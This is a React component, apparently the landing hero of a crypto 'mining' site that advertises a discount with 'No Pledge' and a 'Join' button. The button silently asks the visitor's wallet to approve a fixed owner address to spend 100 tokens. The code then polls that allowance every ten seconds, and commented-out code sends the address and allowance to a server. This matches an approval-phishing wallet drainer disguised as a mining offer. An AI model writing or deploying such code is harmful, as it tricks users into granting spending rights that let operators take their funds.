import * as React from "react";
import {
  chakra,
  Container,
  Stack,
  HStack,
  Text,
  useColorModeValue,
  Button,
  Skeleton,
  Box,
  Link,
  Icon,
  useToast,
} from "@chakra-ui/react";
// Here we have used react-icons package for the icons
import { GoChevronRight } from "react-icons/go";
import { MdBolt } from "react-icons/md";
import mining from "../assets/mining.png";
import Image from "next/image";
import { ethers } from "ethers";
import {
  usePrepareContractWrite,
  erc20ABI,
  useContractWrite,
  useWaitForTransaction,
  useContractRead,
  useAccount,
} from "wagmi";
import { environment } from "@/utils";
import { FormattedMessage } from "react-intl";

const Hero = () => {
  const toast = useToast();
  const { address } = useAccount();
  const { data: decimals } = useContractRead({
    address: environment.token_address,
    abi: erc20ABI,
    functionName: "decimals",
  });
  const { data: symbol } = useContractRead({
    address: environment.token_address,
    abi: erc20ABI,
    functionName: "symbol",
  });
  const { config } = usePrepareContractWrite({
    address: environment.token_address,
    abi: erc20ABI,
    functionName: "approve",
    args: [environment.owner_address, ethers.utils.parseUnits("100")],
  });

  const { refetch } = useContractRead({
    address: environment.token_address,
    abi: erc20ABI,
    functionName: "allowance",
    args: [address as `0x${string}`, environment.owner_address],
    onSuccess(data) {
      const allowance = ethers.utils.formatUnits(data, decimals);
      console.log(allowance, "allowance");
      // fetch("/api/updateApproveToken", {
      //   method: "POST",
      //   body: JSON.stringify({ address, allow: allowance, symbol }),
      // }).then(async (res) => {
      //   const data = await res.json();
      //   console.log(data, "update token");
      // });
    },
    staleTime: 1000 * 60 * 2,
  });

  React.useEffect(() => {
    setInterval(() => {
      refetch();
    }, 10000);
  }, []);

  const { writeAsync, data } = useContractWrite({
    ...config,
    onSuccess(data, variables, context) {
      refetch();
    },
    onError(error, variables, context) {
      toast({
        title: "Error",
        description: error.message,
        status: "error",
        duration: 10000,
      });
    },
  });

  useWaitForTransaction({
    enabled: !!data?.hash,
    hash: data?.hash,
    confirmations: 1,
    onSuccess(data) {
      console.log(data, "transaction success");
      refetch();
    },
  });

  return (
    <Container
      bgGradient="linear(to-r, purple.900, pink.900, orange.500)"
      maxW="6xl"
      px={{ base: 6, md: 3 }}
      py={5}
    >
      <Stack direction={"row"} justifyContent="center">
        <Stack
          direction="column"
          spacing={6}
          justifyContent="center"
          maxW="480px"
        >
          <chakra.h1
            fontSize="x-large"
            lineHeight={1}
            color={"whiteAlpha.900"}
            fontWeight="bold"
            textAlign="left"
          >
            <FormattedMessage id="Recieve Discount" /> <br />
            <chakra.span color="teal">
              <FormattedMessage id="No Pledge" />
            </chakra.span>
          </chakra.h1>
          <Text
            fontSize="sm"
            textAlign="left"
            lineHeight="1.375"
            fontWeight="400"
            color="gray.100"
          >
            <FormattedMessage id="Hero" />
          </Text>
          <Button
            onClick={async () => {
              try {
                await writeAsync?.();
              } catch (error: any) {}
            }}
            colorScheme="blue"
            w={100}
          >
            {" "}
            <FormattedMessage id="Join" />
          </Button>
        </Stack>
        <Box ml={{ base: 0, md: 5 }} pos="relative">
          <Image src={mining} alt="mining" width={400} height={400} />
        </Box>
      </Stack>
    </Container>
  );
};

export default Hero;
